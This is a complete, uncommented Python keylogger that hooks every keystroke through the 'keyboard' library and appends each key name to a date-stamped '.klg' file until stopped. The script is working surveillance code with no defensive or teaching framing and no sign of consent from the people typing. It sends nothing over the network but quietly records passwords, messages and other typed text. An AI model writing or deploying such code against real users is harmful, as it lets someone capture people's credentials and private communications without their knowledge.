import keyboard
from datetime import date

def tecla(event):
    with open('kl'+date.today().strftime('%m%d%y')+'.klg', 'a+') as f:
        f.write(f'{event.name}')

keyboard.hook(tecla)
keyboard.wait()


